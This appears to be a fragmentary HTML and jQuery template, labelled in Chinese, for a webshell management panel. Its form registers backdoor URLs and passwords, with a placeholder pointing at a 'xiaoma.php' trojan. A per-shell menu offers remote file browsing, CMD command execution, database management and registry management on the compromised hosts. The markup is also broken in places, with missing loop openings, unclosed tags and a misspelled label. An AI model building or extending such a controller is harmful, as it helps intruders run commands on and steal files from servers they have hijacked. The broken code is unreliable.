            <div class="panel panel-default">
                <div class="row">
                    <div class="col-sm-12">
                        <div class="col-sm-9">
                            <label id="ponypath" for="field-5" class="control-label">
                                当前路径：<input type="text" value="{{ ponypath }}">
                            </label>
                        </div>
                        <div class="col-sm-3">
                            <label for="field-5" class="control-label">磁盘：</label>
                            <select id="{{ id }}" onclick="return cipang(this.id)" >
                                <option value="digest" >----磁盘----</option>

                                    <option value="{{ d }}" >{{ d }}</option>
                                {% endfor %}

                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="panel-body">
                        <div class="col-sm-12">
                            <table class="table table-model-2 table-hover">
                                <thead>
                                    <tr>
                                        <th>文件名</th>
                                        <th>时间</th>
                                        <th>大小</th>
                                        <th>属性</th>
                                        <th>管理</th>
                                    </tr>
                                </thead>
                                <tbody id="fileresult">
                                {% for f in files %}
                                        <td>{{ f.name }}</td>
                                        <td>{{ f.time }}</td>
                                        <td>{{ f.size }}</td>
                                        <td>{{ f.jurisdiction }}</td>
                                        {% if f.isdir == 1 %}
                                            <td id="{{ id }}">
                                                <a id="{{ ponypath }}/{{ f.name }}" href="javascript:" onclick="return getfile(this.id)">浏览</a>|编辑|下载|删除
                                            </td>
                                        {% else  %}

                                                <a id="{{ ponypath }}/{{ f.name }}" href="javascript:" onclick="return getfile(this.id)">查看</a>|编辑|下载|删除

            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                    <h4 class="modal-title">添加</h4>
                </div>

                    <div class="row">
                        <div class="col-md-12">
                            <div class="form-group">
                                <label for="field-1" class="control-label">备注</label>
                                <input type="text" class="form-control" id="remarks" data-validate="required" data-message-required="This is custom message for required field."   placeholder=测试>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="form-group">
                                <label for="field-2" class="control-label">链接</label>
                                <input type="text" class="form-control" id="links" placeholder="http://webshell.ywclub.org/xiaoma.php">
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="form-group">
                                <labtel for="field-4" class="control-label">密码</labtel>

                        </div>
                        <div class="col-md-12">

                                <select id="type" class="form-control">

    <script>
        $('#addshell').click(function(){
            var remarks = $('#remarks').val();
            if (remarks == "") {
                messagebox('提示',"请输入备注");
                return
            }
            var links = $('#links').val();
            if (links == "") {
                messagebox('提示',"请输入链接");
                return
            }
            var passwd = $('#passwd').val();
            if (passwd == "") {
                messagebox('提示',"请输入密码");
                return
            }
            var type = $('#type').val();
            this.setAttribute("data-dismiss", "modal");
            $.getJSON(
                "add.html",
                {
                    'remarks':remarks,
                    'links':links,
                    'passwd':passwd,
                    'type':type
                },function($jsondata){
                    var $str_html = "";
                    $.each($jsondata.webshell, function($index, $val) {
                        $str_html+= "<tr><td>" + $val.id + "</td><td>" + $val.remarks + "</td><td>" + $val.links + "</td><td>" + $val.type + "</td><td>" + $val.time + "</td><td><select id="+ $val.id +" onclick=\"return getid(this.id)\" ><option value=\"digest\" >----基本功能列表----</option><option value=\"1\" >文件管理</option><option value=\"2\" >执行CMD命令</option><option value=\"3\" >数据库管理</option><option value=\"4\" >注册表管理</option><option value=\"5\" >编辑此WebShell</option><option value=\"6\" >删除此WebShell</option></select></td>"
                    });
                    $("#addresult").html($str_html);

                });
        });
        function messagebox(title,text){
            var opts = {
                    "closeButton": true,
                    "debug": false,
                    "onclick": null,
                    "showDuration": "300",
                    "hideDuration": "1000",
                    "timeOut": "3000",
                    "extendedTimeOut": "1000",
                    "showEasing": "swing",
                    "hideEasing": "linear",
                    "showMethod": "fadeIn",
                    "hideMethod": "fadeOut"
            };
            toastr.success(text, title, opts);
        }
        function cipang(id) {
            var id1 = "#" + id;
            $(id1).change(function(){
                var dir = $(id1).val();
                $.getJSON(
                    "getfile.html",
                    {
                        'id': id,
                        'dir': dir
                    },function($jsondata){
                        var $str_html = "";
                        $.each($jsondata.files, function($index, $val) {
                            if ($val.isdir == "1") {
                                $str_html += "<tr><td>" + $val.name + "</td><td>" + $val.time + "</td><td>" + $val.size + "</td><td>" + $val.jurisdiction + "</td><td><a id=\""+ $jsondata.ponypath + $val.name +"\" href=\"javascript:\" onclick=\"return getfile(this.id)\">浏览</a>|编辑|下载|删除</td></tr>";
                            }else {
                                $str_html += "<tr><td>" + $val.name + "</td><td>" + $val.time + "</td><td>" + $val.size + "</td><td>" + $val.jurisdiction + "</td><td><a href=\"#\">查看</a>|编辑|下载|删除</td></tr>";
                            }
                        });
                        $("#ponypath").html("当前路径：<input type=\"text\" value=\"" + $jsondata.ponypath + "\">");
                        $("#fileresult").html($str_html);
                    }
                );
            });
        }
        function getfile(id) {
            $.getJSON(
                "getfile.html",
                {
                    'id': {{ id }} ,
                    'dir': id
                },function($jsondata){
                    var $str_html = "";
                    $.each($jsondata.files, function($index, $val) {
                        if ($val.isdir == "1") {
                            $str_html += "<tr><td>" + $val.name + "</td><td>" + $val.time + "</td><td>" + $val.size + "</td><td>" + $val.jurisdiction + "</td><td><a id=\""+ $jsondata.ponypath + $val.name +"\" href=\"javascript:\" onclick=\"return getfile(this.id)\">浏览</a>|编辑|下载|删除</td></tr>";
                        }else {
                            $str_html += "<tr><td>" + $val.name + "</td><td>" + $val.time + "</td><td>" + $val.size + "</td><td>" + $val.jurisdiction + "</td><td><a href=\"#\">查看</a>|编辑|下载|删除</td></tr>";
                        }
                    });
                    $("#ponypath").html("当前路径：<input type=\"text\" value=\"" + $jsondata.ponypath + "\">");
                    $("#fileresult").html($str_html);
                }
            );
        }
    </script>
